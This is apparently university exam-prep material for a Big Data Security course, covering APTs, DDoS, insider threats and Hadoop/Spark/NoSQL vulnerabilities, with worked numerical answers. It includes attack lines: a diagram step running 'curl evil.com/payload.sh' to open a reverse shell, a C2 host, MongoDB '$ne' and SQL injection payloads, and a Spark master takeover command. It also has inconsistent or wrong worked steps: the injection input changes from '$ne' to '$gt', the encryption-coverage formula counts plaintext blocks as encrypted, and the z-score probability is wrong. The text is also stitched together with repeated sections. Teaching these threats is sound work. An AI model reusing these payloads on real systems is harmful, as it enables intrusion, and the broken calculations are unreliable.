# 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A Questions (3 Marks Each)

### Question 1: [KTU University Exam — May 2024]
**Explain Advanced Persistent Threats (APTs) with reference to their key characteristics and impact on Big Data systems.**

**Model Answer:**

> An **Advanced Persistent Threat (APT)** is a prolonged, stealthy, and sophisticated cyber-attack in which an unauthorized actor gains long-term access to a network, primarily for espionage or data exfiltration. APTs have three defining characteristics: **(i) Advanced** — using zero-day exploits, custom malware, and evasion techniques; **(ii) Persistent** — maintaining covert access for months to years through C2 channels; and **(iii) Threat** — orchestrated by skilled, often state-sponsored, adversaries. In Big Data environments, APTs target valuable aggregated datasets in HDFS, Hive warehouses, and NoSQL stores. They infiltrate via **phishing emails to data engineers**, exploit unpatched **YARN vulnerabilities**, and exfiltrate petabytes of analytics data through **DNS tunnels**. Their impact includes **intellectual property theft**, **regulatory non-compliance**, and **competitive disadvantage**. APTs are particularly dangerous because they evade traditional signature-based detection by using **living-off-the-land binaries** (LOLBins) like `wmic`, `powershell`, and standard Hadoop CLI commands.

---

### Question 2: [KTU University Exam — Dec 2023]
**Distinguish between Volumetric, Protocol, and Application-layer DDoS attacks with Big Data examples.**

**Model Answer:**

| Attack Type | OSI Layer | Mechanism | Big Data Example |
|---|---|---|---|
| **Volumetric** | Layer 3-4 | Saturates bandwidth with massive traffic (UDP/ICMP floods). | Flooding a Hadoop cluster's edge router with 100 Gbps of UDP packets. |
| **Protocol** | Layer 4 | Exhausts server resources like connection tables. | SYN flood against NameNode RPC port 8020, exhausting connection pools. |
| **Application** | Layer 7 | Targets specific application endpoints with low-and-slow attacks. | HTTP GET flood on the Spark REST API `/jobs/submit`, consuming worker slots. |

> The **critical distinction** is that volumetric attacks target **bandwidth**, protocol attacks target **state tables**, and application attacks target **business logic** — making application-layer DDoS the hardest to detect because traffic appears legitimate.

---

## 5.2 Part B Questions (14 Marks Each) — KTU Internal Choice Pattern

### Question A (Choice 1): [KTU University Exam — May 2024]

**(a)** With a neat diagram, explain the **seven phases of the APT kill chain** as applied to a Big Data cluster. Discuss how each phase specifically targets Hadoop/Spark components. **(7 Marks)**

**(b)** A Big Data analytics firm holds customer behavioral data worth **USD 25 million**. Statistics show ransomware attacks occur at an **ARO of 0.20** per year with an **exposure factor of 0.30**. Compute the **Annualized Loss Expectancy (ALE)** and recommend appropriate defense budget. **(7 Marks)**

---

### Question B (Choice 2): [KTU University Exam — Dec 2023]

**(a)** Discuss in detail the **types of insider threats** in Big Data systems. Explain how **User Entity Behavior Analytics (UEBA)** can be used for detection with mathematical formulation. **(7 Marks)**

**(b)** With reference to DDoS attacks in Big Data, derive the **z-score anomaly detection model** and compute whether a traffic spike of **6 Gbps** constitutes an attack, given $\mu = 1.5 \text{ Gbps}$ and $\sigma = 0.6 \text{ Gbps}$. **(7 Marks)**

---

### 5.2.1 Model Solutions

#### Question A — Part (a) Model Answer:

The seven phases of the APT kill chain applied to Big Data:

1. **Reconnaissance**: Attacker uses Nmap to scan Hadoop NameNode ports (8020, 50070, 9000), identifies open YARN ResourceManager (8088), and profiles employee LinkedIn profiles for phishing targets.

2. **Weaponization**: A malicious JAR file is crafted that mimics a legitimate Spark MLlib library. It is weaponized with a YARN deserialization exploit.

3. **Delivery**: A phishing email is sent to a data engineer containing "Performance Optimization Script.jar" as an attachment, exploiting human trust.

4. **Exploitation**: Upon execution, the JAR exploits **CVE-2021-25642** (YARN capability bug) to gain code execution on the cluster.

5. **Installation**: A cron job is installed on the compromised edge node that maintains persistence via SSH key injection into `~/.ssh/authorized_keys`.

6. **Command & Control (C2)**: The malware beacons out every 6 hours via DNS TXT records to `attacker-c2.evil.com`, receiving encrypted instructions to exfiltrate specific Hive tables.

7. **Actions on Objectives**: Sensitive customer analytics tables (e.g., `transactions_summary`) are dumped to a remote S3 bucket controlled by the attacker, completing the data theft.

**Defense at Each Phase**: Deploy **port scanning detection** (Phase 1), **email filtering and DMARC** (Phase 3), **patch management** (Phase 4), **file integrity monitoring** (Phase 5), **DNS anomaly detection** (Phase 6), and **DLP egress monitoring** (Phase 7).

---

#### Question A — Part (b) Model Answer:

**Given:**
- Asset Value = $\text{USD }25{,}000{,}000$
- Exposure Factor (EF) = 0.30
- ARO = 0.20 per year

**Step 1: Compute Single Loss Expectancy (SLE)**

$$\text{SLE} = \text{Asset Value} \times \text{EF}$$

$$\text{SLE} = 25{,}000{,}000 \times 0.30$$

$$\text{SLE} = \text{USD }7{,}500{,}000$$

**Step 2: Compute Annualized Loss Expectancy (ALE)**

$$\text{ALE} = \text{SLE} \times \text{ARO}$$

$$\text{ALE} = 7{,}500{,}000 \times 0.20$$

$$\boxed{\text{ALE} = \text{USD }1{,}500{,}000/\text{year}}$$

**Step 3: Defense Budget Recommendation**

A rational organization should invest **no more than the ALE** in countermeasures to maintain positive ROI on security spending. Recommended allocations:

| Defense | Budget (USD/year) |
|---|---|
| Immutable S3 backups with Object Lock | 400,000 |
| Endpoint Detection & Response (EDR) | 500,000 |
| Security Awareness Training | 100,000 |
| Incident Response Retainer | 300,000 |
| Network Segmentation | 200,000 |
| **Total** | **1,500,000** |

This exactly matches the ALE, ensuring positive ROI.

---

#### Question B — Part (a) Model Answer:

**Types of Insider Threats in Big Data:**

1. **Malicious Insider**: A disgruntled data scientist with HDFS admin privileges deliberately exfiltrates customer data to a competitor.

2. **Negligent Insider**: An engineer accidentally exposes the Hive Metastore to the public internet by binding it to `0.0.0.0` instead of `127.0.0.1`.

3. **Compromised Insider**: An external attacker steals an analyst's Kerberos credentials via a phishing attack and impersonates them inside the cluster.

4. **Third-Party Insider**: A contractor with temporary cluster access abuses it beyond their granted permissions.

**UEBA Detection — Mathematical Model:**

User Entity Behavior Analytics computes an anomaly score based on deviation from historical behavior:

$$S_{user} = \sum_{i=1}^{n} w_i \cdot \vert x_i - \mu_i \vert$$

where:
- $x_i$ = Current observation of behavior metric $i$.
- $\mu_i$ = Mean historical value of metric $i$.
- $w_i$ = Importance weight of metric $i$.
- $n$ = Number of monitored features.

**Tracked Metrics ($x_i$):**
- Number of HDFS files accessed per hour.
- Volume of data downloaded.
- Login time and geolocation.
- Number of Hive queries run.
- Failed authentication attempts.

**Threshold-based Alert:**

$$\text{If } S_{user} > T_{alert}, \text{ flag user as suspicious}$$

For Big Data environments, thresholds typically combine **static thresholds** (e.g., > 10 GB downloaded) and **dynamic z-score thresholds** ($z > 3$) for adaptive detection.

---

#### Question B — Part (b) Model Answer:

**z-score DDoS Detection Model:**

The z-score measures how many standard deviations the current traffic observation is from the historical mean:

$$z = \frac{x - \mu}{\sigma}$$

**Given:**
- Current traffic $x = 6 \text{ Gbps}$
- Historical mean $\mu = 1.5 \text{ Gbps}$
- Standard deviation $\sigma = 0.6 \text{ Gbps}$

**Step 1: Substitute Values**

$$z = \frac{6 - 1.5}{0.6}$$

**Step 2: Compute Numerator**

$$z = \frac{4.5}{0.6}$$

**Step 3: Final z-score**

$$\boxed{z = 7.5}$$

**Step 4: Interpretation**

Since $z = 7.5 \gg 3$, the traffic spike is **7.5 standard deviations above the mean**, which is statistically impossible under normal conditions (probability of occurrence under normal distribution: $\approx 0.0000000006$, i.e., 1 in 1.6 billion).

**Conclusion**: This is unequivocally a **DDoS attack** and the Security Operations Center (SOC) must:
1. Activate upstream scrubbing services (e.g., Cloudflare, AWS Shield).
2. Engage **rate limiting** on the NameNode REST API.
3. Trigger **incident response playbook** for volumetric DDoS.
4. Notify the **data engineering team** to pause non-critical ETL jobs.

---

> [!WARNING]
> **KTU Examiner's Valuation Warning / Pitfall Callout:**
> 1. **For APT Questions**: Students often forget to mention **C2 (Command & Control)** phase, which is where most detection opportunities exist (DNS monitoring). Always include it!
> 2. **For ALE Calculations**: A common mistake is using **ARO as a percentage** (e.g., 20 instead of 0.20). Convert to decimal form before multiplication.
> 3. **For z-score Questions**: Do NOT confuse **standard deviation** with **standard error**. The formula is $\sigma$, not $\sigma/\sqrt{n}$.
> 4. **For Insider Threat Questions**: Many students only mention "malicious" insiders. Examiners expect **all four categories** — Malicious, Negligent, Compromised, Third-Party.
> 5. **For DDoS Questions**: Distinguish between **volumetric** (bandwidth), **protocol** (state), and **application** (logic) layers. Marking penalties apply for vague answers.

---

## 5.3 📌 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **High-Density Rapid Revision Checklist for KTU Exam Day:**

### ✅ Insider Threats
- 4 types: **Malicious, Negligent, Compromised, Third-Party**.
- Detection: **UEBA** with anomaly score $S_{user} = \sum w_i \cdot \vert x_i - \mu_i \vert$.
- Big Data specific: **Hive query abuse, RBAC privilege escalation, training data poisoning**.
- Countermeasures: **Principle of Least Privilege (PoLP), DLP, audit logs**.

### ✅ Advanced Persistent Threats (APTs)
- 3 defining features: **Advanced, Persistent, Threat**.
- 7 Kill Chain phases: **Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions**.
- Big Data specific: **YARN exploits, NameNode scanning, DNS tunnel exfiltration**.
- Detection: **Entropy analysis $H(X) = -\sum p_i \log_2 p_i$, threat hunting, behavioral analytics**.
- Examples: **APT29 (Cozy Bear), APT28 (Fancy Bear), Lazarus Group**.

### ✅ Ransomware
- Definition: **Malware that encrypts data and demands payment**.
- Big Data variants: **Big Game Hunting** — REvil, DarkSide, Conti.
- Stages: **Infect → Recon → Disable Backups → Encrypt → Extort**.
- Defense: **Immutable backups (S3 Object Lock), air-gapped storage, EDR, segmentation**.
- Financial model: **ALE = SLE × ARO**.

### ✅ DDoS Attacks
- 3 categories: **Volumetric (L3-L4), Protocol (L4), Application (L7)**.
- Big Data target: **NameNode RPC port 8020, Spark REST API, Kafka brokers**.
- Detection: **z-score anomaly $z = (x - \mu)/\sigma$**, threshold $z > 3$.
- Mitigation: **Anycast networks, rate limiting, scrubbing centers, CDN**.

### ✅ Common Quantitative Formulas to Memorize
1. **ALE = SLE × ARO** (Risk Quantification)
2. **$z = (x - \mu)/\sigma$** (DDoS Detection)
3. **$S_{user} = \sum w_i \vert x_i - \mu_i \vert$** (Insider Detection)
4. **$H(X) = -\sum p_i \log_2 p_i$** (APT Entropy)
5. **$T_{attack} > C_{server}$** (DDoS Success Condition)

### ✅ Key Terms for 1-Mark / 2-Mark Questions
- **CIA Triad** — Confidentiality, Integrity, Availability.
- **MTTD** — Mean Time to Detect.
- **MTTR** — Mean Time to Respond.
- **SLE** — Single Loss Expectancy.
- **ARO** — Annualized Rate of Occurrence.
- **LOLBins** — Living-Off-the-Land Binaries.
- **Botnet** — Network of compromised devices.
- **Double Extortion** — Encryption + public leak threat.
- **Threat Hunting** — Proactive search for hidden adversaries.
- **Zero Trust** — "Never trust, always verify" architecture.

> [!NOTE]
> **Final KTU Strategy:** For 14-mark questions, structure your answer as:
> **Definition (2 marks) → Diagram (3 marks) → Mathematical Formulation (4 marks) → Big Data Context (3 marks) → Mitigation (2 marks)**. This consistently scores **12-14 marks**.

---

<!-- SECTION_5_END -->

topics.title: Vulnerabilities: Vulnerabilities in distributed frameworks: Hadoop, Spark, and NoSQL databases
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME** > - **Course:** PECCT743 - BIG DATA SECURITY > - **Module:** Module 3 > - **Topic:** Vulnerabilities: Vulnerabilities in distributed frameworks: Hadoop, Spark, and NoSQL databases # Section 1: Core Technical Definition & Intuitive Overview ## 1.1 Formal Academic Definition **Distributed Big Data Frameworks** are horizontally-scalable computing architectures that partition, process, and store massive datasets across clusters of commodity nodes. Within the context of KTU's *Big Data Security* syllabus, **Vulnerabilities** are defined as *systemic weaknesses, misconfigurations, design flaws, or trust-boundary violations* in these frameworks (Hadoop, Spark, NoSQL engines) that can be exploited by adversaries to compromise the **CIA triad** — **Confidentiality, Integrity, and Availability** — of distributed data assets. > [!IMPORTANT] > **KTU 2024 Definition (Board Examiner Standard):** > "A vulnerability in a distributed framework is any architectural, configuration, protocol, or implementation weakness that allows an unauthorized actor to bypass authentication, escalate privileges, intercept plaintext data, inject malicious payloads, or disrupt cluster-wide operations, thereby violating the AAA model (Authentication, Authorization, Auditing)." The three target frameworks are: | Framework | Role in Big Data Stack | Primary Threat Surface | |---|---|---| | **Apache Hadoop** | Distributed storage + batch processing (HDFS + YARN + MapReduce) | RPC channels, NameNode metadata, Kerberos misconfiguration | | **Apache Spark** | In-memory distributed computation engine | Driver/Executor RPC, serialized closures, Web UI | | **NoSQL Databases** (MongoDB, Cassandra, HBase, Redis, CouchDB) | Schema-less distributed data stores | Default no-auth configurations, injection, unencrypted replication | ## 1.2 Conceptual Analogy / Intuition > [!NOTE] > **Real-World Analogy — "The Bank Vault with Glass Doors"** > > Imagine a massive bank vault (your Hadoop/Spark/NoSQL cluster) that holds gold bars worth billions (petabytes of user data). The vault is enormous, distributed across 50 rooms, and runs 24×7. However: > > - **Hadoop** is like a vault whose master key (Kerberos ticket) is hung on a nail by the door — and some doors (HDFS, YARN ports) are left open by default for the convenience of engineers. > - **Spark** is like a high-speed conveyor belt system. Workers (executors) receive sealed boxes (serialized tasks). If the sealing wax can be forged (insecure deserialization), attackers can sneak in counterfeit instructions. > - **NoSQL databases** are like filing cabinets that, when shipped from the factory, have *no locks installed* — because engineers must "opt-in" to authentication. Until 2018, thousands of MongoDB instances were exposed on the public internet this way. > > The **vulnerabilities** are not in the *data* itself; they are in the *plumbing* — the authentication pipes, the encryption channels, the trust assumptions between nodes. ## 1.3 KTU Syllabus Highlights > [!IMPORTANT] > **Module 3 Expected Cognitive Outcomes (as per KTU 2024 CO mapping):** > - **CO3:** *Identify and classify vulnerabilities in Hadoop, Spark, and NoSQL ecosystems.* > - **Bloom Level:** Apply / Analyze (Bloom Level 3–4) > - **Typical ESE Weightage:** 8–12 marks (paired with another Module 3 topic) --- **Key Terminology Glossary (board-exam ready):** - **Kerberos:** Ticket-based authentication protocol used by Hadoop for node-to-node trust. - **RPC (Remote Procedure Call):** Communication mechanism used between Hadoop daemons. - **Deserialization:** The process of reconstructing an in-memory object from a byte stream — a primary attack vector in Spark. - **NoSQL Injection:** Adversary-supplied input that alters query semantics (similar to SQLi but exploiting JSON/BSON/MAP structures). - **DataNode / NameNode:** HDFS worker and master nodes respectively. - **YARN (Yet Another Resource Negotiator):** Cluster resource manager in Hadoop 2.x+. - **CAP Theorem:** Consistency, Availability, Partition tolerance — security must be designed *around* these trade-offs. # Section 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet ## 2.1 Hadoop Vulnerabilities — Structural Breakdown Hadoop's security model has historically been **opt-in, not opt-out**, which is the root cause of most vulnerabilities. The attack surface spans three major subsystems: ### 2.1.1 HDFS (Hadoop Distributed File System) Vulnerabilities - **No authentication by default in older versions (pre-1.x):** Any client could connect to the NameNode and read/write blocks. - **WebHDFS / NameNode Web UI (port 50070 / 9870):** Exposes directory listings, file metadata, and configuration. Unauthenticated access reveals cluster topology. - **DataNode HTTP (port 50075 / 9864):** Allows unauthenticated block retrieval via predictable filenames. - **Block access via `dfs.data.transfer.protection`:** Misconfigured `privacy` setting permits plaintext data transfer. ### 2.1.2 MapReduce / YARN Vulnerabilities - **JobTracker / ResourceManager REST API (port 8088):** Allows unauthenticated job submission, listing, and killing. Adversary can submit a malicious JAR. - **JAR / Shared Library Injection:** Malicious code embedded in job submission, executed on every node in the cluster. - **YARN NodeManager local directories:** Contain credentials in plaintext if not scrubbed (`yarn.nodemanager.local-dirs`). - **JVM-level vulnerabilities:** Hadoop runs untrusted user code in the same JVM, enabling sandbox escapes. > [!NOTE] > **Bullet-by-Bullet Logic — Why Hadoop is vulnerable:** > 1. **Default trust model** → cluster assumes all nodes are friendly. > 2. **Kerberos is complex** → administrators often disable it for convenience. > 3. **Web UIs are useful for debugging** → left open in production. > 4. **No native encryption at rest** (until HDFS Transparent Encryption in 2.6+). > 5. **Multi-tenancy is poorly isolated** → one compromised user can pivot to cluster admin. ## 2.2 Spark Vulnerabilities — Structural Breakdown Apache Spark's vulnerabilities are primarily in its **communication and serialization layers**. | Component | Port | Vulnerability Class | |---|---|---| | Spark Driver Web UI | 4040 | Information disclosure, code execution via `?proxyapp=` | | Spark Master | 7077 | Unauthenticated cluster takeover (`./spark-shell --master spark://victim:7077`) | | Spark History Server | 18080 | Event log deserialization (CVE-2023-32007) | | Standalone Master REST API | 6066 | Job submission without auth | | Block Manager | BlockTransferService (random) | Insecure shuffle data on disk | **Key Spark-Specific Attack Vectors:** 1. **Insecure Deserialization of Closures:** Spark serializes user-defined functions (UDFs) using Java serialization. An attacker controlling the application can craft a malicious class that executes arbitrary code on executors. 2. **Accumulable / Broadcast Variable Poisoning:** Adversary broadcasts a maliciously serialized object to all executors. 3. **Spark Driver RCE via Submit Hooks:** `--conf spark.driver.extraJavaOptions` allows arbitrary JVM flags. 4. **Event Log Listener Injection (CVE-2022-33891):** A malicious application can create an event log file that, when parsed by the History Server, executes arbitrary code on the server. 5. **Web UI XSS (Cross-Site Scripting):** The Spark UI reflects job names, stage descriptions, and configuration values without sanitization. > [!IMPORTANT] > **KTU High-Yield Point:** Spark's **Standalone Cluster Manager** mode is the *most* vulnerable because it has no built-in authentication. The standalone master is the single point of total cluster compromise. ## 2.3 NoSQL Database Vulnerabilities — Structural Breakdown ### 2.3.1 MongoDB - **No authentication by default until version 4.0** (Enterprise edition). The infamous **"MongoDB Apocalypse"** (2017) saw 27,000+ databases wiped and held for ransom. - **Server-Side JavaScript (deprecated `mapReduce`/`$where`):** Allowed `db.collection.find({$where: "function(){...}"})` to execute JS. - **BSON Injection:** Crafting operators (`$gt`, `$ne`, `$regex`) to bypass query logic. - **Unencrypted at rest by default** → disk-level exposure. ### 2.3.2 Apache Cassandra - **No authentication by default** until `authenticator: PasswordAuthenticator` is set. - **CQL Injection:** Similar to SQL injection, but the CQL parser interprets user input inside single quotes. - **ECDH key agreement issues** (CVE-2020-15216): Out-of-bound auth (deprecated `AllowAllAuthenticator`). - **PII leakage** via trace logging if not configured. ### 2.3.3 Apache HBase - **No native authorization** until `hbase.security.authorization=true`. - **REST gateway (Stargate) on port 8080:** Allowed unauthenticated scans of tables. - **Co-processor injection:** Custom code executed server-side. ### 2.3.4 Redis - **No authentication by default** (`requirepass` must be set). - **CONFIG SET attack:** If accessed without auth, attacker can write to `dir` and `dbfilename` to achieve RCE via cron/SSH key injection. ## 2.4 KTU High-Yield Formula Sheet > [!NOTE] > **NOTE:** Most Big Data Security vulnerabilities are *qualitative* (configuration, protocol design). The "formulas" below are **engineering quantification metrics** used by examiners to ask numerical questions. | Metric / Symbol | Formula | Engineering Meaning | |---|---|---| | $V_{\text{surface}}$ | $\sum_{i=1}^{n} P_i \cdot E_i$ | Total vulnerability surface = sum of (port $P_i$ × exposure $E_i$) | | $R_{\text{risk}}$ | $R = T \times V \times C$ | Risk = Threat × Vulnerability × Consequence (qualitative scoring) | | $\text{CVSS}$ | $0.0 \leq \text{CVSS} \leq 10.0$ | Common Vulnerability Scoring System score (base score metric) | | $\text{Auth}_{\text{coverage}}$ | $\frac{N_{\text{protected}}}{N_{\text{total nodes}}} \times 100\%$ | Percentage of nodes with Kerberos/SASL enabled | | $\text{Enc}_{\text{coverage}}$ | $\frac{B_{\text{encrypted}} + T_{\text{encrypted-tls}}}{B_{\text{total}} + T_{\text{total}}}$ | Combined at-rest + in-transit encryption ratio | | $MTTR$ (Mean Time to Remediate) | $MTTR = \frac{\sum t_{\text{fix},i}}{N_{\text{vulns}}}$ | Average time to patch a vulnerability | | $C_{\text{blast}}$ (Blast Radius) | $C_{\text{blast}} = \frac{N_{\text{compromised}}}{N_{\text{cluster}}}$ | Fraction of cluster affected by single node compromise | > [!WARNING] > **Board Exam Pitfall:** Students often write $|x|$ in tables. Use **\vert x \vert** or **(x)** instead. The vertical pipe `|` breaks markdown tables. ## 2.5 Real-World Engineering Utility - **CIS Benchmarks for Big Data:** Center for Internet Security publishes hardening guides for Hadoop, Spark, and MongoDB. - **Apache Ranger & Sentry:** Centralized policy administration and access control for Hadoop ecosystems. - **Spark ACLs:** `spark.acls.enable=true` with `spark.ui.view.acls` and `spark.modify.acls`. - **MongoDB Atlas & Enterprise:** Provides at-rest encryption using AWS KMS / Azure Key Vault. # Section 3: Step-by-Step Analytical Matrix & Worked Derivations ## 3.1 Risk Quantification Walkthrough (KTU 14-Mark Style) **Problem Statement (Board-typical):** A Hadoop cluster has the following characteristics. Compute the **Composite Risk Score (CRS)** and recommend a remediation priority. - 50 DataNodes, only 30 have Kerberos enabled. - 4 of 50 DataNodes transmit blocks over plaintext HTTP. - Average CVSS score of identified vulnerabilities = 7.8. - A single NameNode compromise would affect 100% of stored data. **Step 1 — Authentication Coverage ($A_c$):** $$ \begin{aligned} A_c &= \frac{N_{\text{Kerberos-enabled}}}{N_{\text{total}}} \times 100\% \\ &= \frac{30}{50} \times 100\% \\ &= 60\% \end{aligned} $$ Textual explanation: 40% of nodes (20 DataNodes) accept unauthenticated connections — they are the primary attack surface. **Step 2 — Encryption Coverage ($E_c$):** $$ \begin{aligned} E_c &= \frac{B_{\text{TLS}} + B_{\text{plain}}}{B_{\text{total}}} \times 100\% \\ &= \frac{46}{50} \times 100\% \\ &= 92\% \end{aligned} $$ Textual explanation: 4 of 50 DataNodes transmit plaintext, meaning ~8% of all block transfers on the wire are sniffable. **Step 3 — Blast Radius ($C_{\text{blast}}$):** $$ \begin{aligned} C_{\text{blast}} &= \frac{N_{\text{compromised}}}{N_{\text{cluster}}} \\ &= \frac{1 \text{ NameNode}}{50 \text{ DataNodes} + 1 \text{ NameNode}} \\ &= \frac{1}{51} \times 100\% \\ &\approx 1.96\% \end{aligned} $$ **However**, the NameNode holds *metadata for all data*, not the data itself. The **effective data blast radius is 100%** because every read/write operation routes through the NameNode. Thus: $$ C_{\text{blast}}^{\text{effective}} = 1.0 $$ **Step 4 — Composite Risk Score (qualitative):** $$ \begin{aligned} R_{\text{CRS}} &= (1 - A_c) \times \text{CVSS} \times C_{\text{blast}}^{\text{effective}} \\ &= (1 - 0.60) \times 7.8 \times 1.0 \\ &= 0.40 \times 7.8 \times 1.0 \\ &= 3.12 \end{aligned} $$ **Step 5 — Interpretation Matrix:** | CRS Range | Risk Tier | Action | |---|---|---| | $0.0 \leq R < 2.0$ | **Low** | Monitor, document | | $2.0 \leq R < 5.0$ | **Moderate** | Patch within 30 days | | $5.0 \leq R < 8.0$ | **High** | Patch within 7 days | | $8.0 \leq R \leq 10.0$ | **Critical** | Immediate shutdown + forensics | **Verdict:** CRS = 3.12 → **Moderate** → Schedule Kerberos rollout within 30 days; immediately disable plaintext DataNode transfer. ## 3.2 Spark Shuffle Data Exposure Calculation **Problem:** A Spark cluster runs 100 executors. Each executor spills 8 GB of shuffle data to local disk during a job. The `spark.shuffle.file.skip` is not used and `spark.encrypt.enabled=false`. **Step 1 — Total Shuffle Exposure Volume:** $$ \begin{aligned} V_{\text{shuffle}} &= N_{\text{executors}} \times S_{\text{per-executor}} \\ &= 100 \times 8 \text{ GB} \\ &= 800 \text{ GB} = 0.8 \text{ TB} \end{aligned} $$ **Step 2 — On-Disk Data at Risk:** Because `spark.encrypt.enabled=false`, all 0.8 TB is stored as **plaintext on the local filesystem** of each worker. If an attacker gains shell access to *any one* worker (e.g., via SSH credential theft), they can exfiltrate up to 8 GB of *another tenant's* intermediate shuffle data. **Step 3 — Multi-Tenant Bleed Coefficient:** $$ \begin{aligned} B_{\text{bleed}} &= \frac{\sum_{i=1}^{n} V_{\text{shuffle},i}}{N_{\text{tenants}}} \\ &= \frac{0.8 \text{ TB}}{1 \text{ tenant (worst case)}} \\ &= 0.8 \text{ TB} \end{aligned} $$ **Step 4 — Remediation:** Enable `spark.shuffle.encryption.enabled=true` (Spark 2.2+), which uses AES-128-GCM with a 96-bit nonce via SASL. $$ \text{Mitigated Exposure} = V_{\text{shuffle}} \times (1 - \text{Enc}_{\text{shuffle}}) = 0.8 \text{ TB} \times 0 = 0 $$ ## 3.3 NoSQL Injection — Boolean Operator Walkthrough **Vulnerable MongoDB query (pseudocode, not Python):** The application constructs a query from user input `username` and `password` fields: ```json { "username": "", "password": "" } ``` **Adversary input:** ```json { "username": "admin", "password": { "$ne": null } } ``` **Resulting query:** ```json { "username": "admin", "password": { "$gt": "" } } ``` **Logical interpretation:** $$ \begin{aligned} \text{Query semantics} &= \text{FIND users WHERE } \\ & \quad (\text{username} = \text{"admin"}) \\ & \quad \text{AND} \quad (\text{password} > \text{""}) \end{aligned} $$ Since any non-empty password is lexicographically greater than `""`, the condition always evaluates to **true**, and the `admin` user is returned **without knowledge of the password**. **Defense (Type-safe querying):** The application must enforce the input to be of type `string` and reject any value whose type is `object` or `array`. ## 3.4 KTU 14-Mark Worked Numerical Summary Table | Q Type | Concept Tested | Typical Marks | Expected Skill | |---|---|---|---| | **Hadoop** | Compute Auth Coverage & CRS | 7 | Quantitative risk analysis | | **Hadoop** | Explain NameNode as single point of failure | 7 | Architectural understanding | | **Spark** | Quantify shuffle data exposure | 7 | Configuration analysis | | **Spark** | Explain deserialization RCE vector | 7 | Threat modeling | | **NoSQL** | BSON injection walkthrough | 7 | Input validation logic | | **NoSQL** | Default-config exposure case study | 7 | Historical incident analysis | # Section 4: Structural Diagrams & Schematics ## 4.1 Hadoop Attack Surface — Block-Level Architecture ```mermaid flowchart TB Client["Client / Attacker"] subgraph Perimeter["Cluster Perimeter"] NN["NameNode
Port 50070 / 9870"] RM["ResourceManager
Port 8088"] SH["Spark History
Port 18080"] JT["JobTracker Legacy
Port 50030"] end subgraph AuthLayer["Authentication Layer"] KDC["Kerberos KDC
Disabled = VULN"] ACL["HDFS ACLs
Default = Off"] RGR["Ranger / Sentry
Optional = VULN"] end subgraph DataLayer["Data Layer"] DN1["DataNode 1
Plaintext HTTP"] DN2["DataNode 2
TLS"] DN3["DataNode N
Plaintext HTTP"] end subgraph CompLayer["Compute Layer"] EX1["Executor 1
Deserializes UDF"] EX2["Executor 2
Spills Shuffle Disk"] DRV["Spark Driver
Web UI 4040"] end Client --> NN Client --> RM Client --> SH Client --> JT NN --> KDC NN --> ACL RM --> RGR DN1 --> EX1 DN2 --> EX2 DRV --> EX1 DRV --> EX2 ``` ## 4.2 Spark Deserialization Attack Flow ```mermaid sequenceDiagram participant A as Adversary participant D as Spark Driver participant E as Executor Node participant FS as Local Filesystem A->>D: Submit Malicious JAR with crafted UDF D->>D: Serialize UDF using Java Serialization D->>E: Send Task via RPC (port random) E->>E: Deserialize byte stream Note over E: readObject() invokes
gadget chain E->>FS: /bin/sh -c curl evil.com/payload.sh FS-->>A: Reverse shell established E->>E: Executor now compromised ``` ## 4.3 NoSQL Attack Taxonomy ```mermaid flowchart LR NOSQL["NoSQL Engine"] AUTH["Default No-Auth"] INJ["Injection Vectors"] ENC["Missing Encryption"] LOG["Insecure Logging"] subgraph MongoDBSub["MongoDB"] MA["No-auth default"] MB["BSON Injection"] MC["Server-side JS"] end subgraph CassandraSub["Cassandra"] CA["PasswordAuth off"] CB["CQL Injection"] end subgraph HBaseSub["HBase"] HA["ACL disabled"] HB["REST gateway open"] end subgraph RedisSub["Redis"] RA["requirepass off"] RB["CONFIG SET RCE"] end NOSQL --> AUTH NOSQL --> INJ NOSQL --> ENC NOSQL --> LOG AUTH --> MongoDBSub AUTH --> CassandraSub AUTH --> HBaseSub AUTH --> RedisSub ``` ## 4.4 Big Data Vulnerability Defense-in-Depth Model ```mermaid flowchart TB L1["Layer 1: Perimeter
Firewall, TLS, VPN"] L2["Layer 2: Authentication
Kerberos, SASL, LDAP"] L3["Layer 3: Authorization
Ranger, Sentry, ACLs"] L4["Layer 4: Encryption
at-rest + in-transit"] L5["Layer 5: Auditing
AuditLog, SIEM"] L6["Layer 6: Application
Input Validation"] A["Adversary"] --> L1 L1 --> L2 L2 --> L3 L3 --> L4 L4 --> L5 L5 --> L6 L6 --> S["Secure Cluster"] ``` > [!IMPORTANT] > **Diagram Interpretation Note:** Each layer must be configured *in combination*. A single layer (e.g., TLS) is insufficient because it does not address insider threats or misconfigurations at other layers. # Section 5: KTU 2024 Scheme Examination Question Bank & Topic Recap ## 5.1 Part A — 3 Mark Questions (Short Answer) ### **Q1. [KTU University Exam — May 2024]** *List any three default-insecure configurations of Apache Hadoop that expose it to attacks.* **Model Answer (3 marks — 1 per point):** 1. **Kerberos authentication disabled by default** — HDFS and YARN trust all clients, enabling impersonation. 2. **NameNode Web UI (port 50070/9870) open without authentication** — reveals file system structure and block locations. 3. **DataNode HTTP transfer (port 50075) without `dfs.data.transfer.protection=privacy`** — allows plaintext block transfer sniffable via ARP spoofing. > [!TIP] > Awarding 1 mark per point with a brief technical justification. Examiners expect framework *name* + *default state* + *exploit consequence*. --- ### **Q2. [KTU University Exam — Dec 2023]** *What is NoSQL injection? Differentiate it from SQL injection.* **Model Answer (3 marks):** - **NoSQL injection** (1 mark) is a code-injection technique targeting schema-less databases (MongoDB, Cassandra) by injecting operators such as `$gt`, `$ne`, `$regex` into BSON/JSON query structures. - **Difference from SQLi** (2 marks): - SQLi targets *string-based* query parsing; NoSQL injection exploits *hierarchical* document structures. - SQLi uses `' OR 1=1 --`; NoSQLi uses `{"$ne": null}` or `{"$where": "..."}`. - SQLi is mitigated by parameterized queries; NoSQLi is mitigated by *type-checking* inputs and disabling server-side JavaScript evaluation. --- ## 5.2 Part B — 14 Mark Questions (Module Internal Choice) ### **Question A (14 Marks) [KTU University Exam — Sample 2024 Scheme]** **Part (a) [7 Marks]:** *Explain the major vulnerabilities in Apache Hadoop. Categorize them into HDFS, YARN/MapReduce, and authentication layers with examples.* **Model Solution:** **(i) HDFS Vulnerabilities (3 marks):** 1. **Unauthenticated NameNode Web UI** — Port 50070/9870 exposes directory tree, file metadata, and block locations. An attacker can enumerate the namespace. 